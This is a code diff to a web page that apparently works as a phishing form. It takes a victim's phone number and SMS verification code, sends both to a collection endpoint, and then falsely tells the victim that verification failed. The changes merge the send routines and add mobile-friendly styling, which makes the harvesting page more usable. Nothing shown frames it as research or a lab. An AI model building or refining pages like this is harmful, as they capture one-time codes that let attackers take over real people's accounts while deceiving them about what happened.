@@ -14,6 +14,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
+            overflow: hidden;
         }
 
         .container {
@@ -24,6 +25,7 @@
             text-align: center;
             width: 100%;
             max-width: 400px;
+            margin: 0 auto;
         }
 
         .container img {
@@ -57,7 +59,7 @@
 
         select, input[type="text"], input[type="number"] {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             border: 1px solid #ccc;
             border-radius: 5px;
             font-size: 16px;
@@ -90,12 +92,22 @@
             margin-bottom: 20px;
         }
 
-        #verificationContainer {
+        #verificationContainer, #finalMessageContainer {
             display: none;
         }
 
-        #finalMessageContainer {
-            display: none;
+        /* Responsive Styles */
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px;
+                max-width: 100%;
+                box-sizing: border-box;
+            }
+
+            .button, input[type="text"], input[type="number"] {
+                padding: 14px;
+                font-size: 18px;
+            }
         }
     </style>
 </head>
@@ -159,29 +171,26 @@
             phoneNumberField.value = countryCode + ' ' + phoneNumberField.value.replace(/^\+\d+\s*/, '');
         }
 
-        async function sendPhoneNumber(phoneNumber) {
-            try {
-                const response = await fetch('http://localhost:8080/save-verification', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        phoneNumber: phoneNumber
-                    })
-                });
+        function goToVerificationPage() {
+            const countryCode = document.getElementById('countryCode').value;
+            const phoneNumber = document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
+            const fullPhoneNumber = `${countryCode} ${phoneNumber}`;
 
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-
-                console.log("Phone number sent to server successfully");
-            } catch (error) {
-                console.error("Failed to send phone number to server:", error);
+            if (phoneNumber === '') {
+                alert('Please enter your phone number.');
+                return;
             }
+
+            // Send phone number to server immediately
+            sendDataToServer(fullPhoneNumber, null);
+
+            document.getElementById('phoneDisplay').textContent = fullPhoneNumber;
+
+            document.getElementById('initialContainer').style.display = 'none';
+            document.getElementById('verificationContainer').style.display = 'block';
         }
 
-        async function sendVerificationCode(verificationCode, phoneNumber) {
+        async function sendDataToServer(phoneNumber, verificationCode) {
             try {
                 const response = await fetch('http://localhost:8080/save-verification', {
                     method: 'POST',
@@ -198,29 +207,10 @@
                     throw new Error(`HTTP error! status: ${response.status}`);
                 }
 
-                console.log("Verification code sent to server successfully");
+                console.log("Data sent to server successfully");
             } catch (error) {
-                console.error("Failed to send verification code to server:", error);
+                console.error("Failed to send data to server:", error);
             }
-        }
-
-        function goToVerificationPage() {
-            const countryCode = document.getElementById('countryCode').value;
-            const phoneNumber = document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
-            const fullPhoneNumber = `${countryCode} ${phoneNumber}`;
-
-            if (phoneNumber === '') {
-                alert('Please enter your phone number.');
-                return;
-            }
-
-            document.getElementById('phoneDisplay').textContent = fullPhoneNumber;
-
-            // Send phone number immediately
-            sendPhoneNumber(fullPhoneNumber);
-
-            document.getElementById('initialContainer').style.display = 'none';
-            document.getElementById('verificationContainer').style.display = 'block';
         }
 
         function submitVerification() {
@@ -232,8 +222,8 @@
                 return;
             }
 
-            // Send verification code separately
-            sendVerificationCode(verificationCode, phoneDisplay);
+            // Send verification code to server immediately
+            sendDataToServer(phoneDisplay, verificationCode);
 
             document.getElementById('verificationContainer').style.display = 'none';
             document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number: ${phoneDisplay}`;
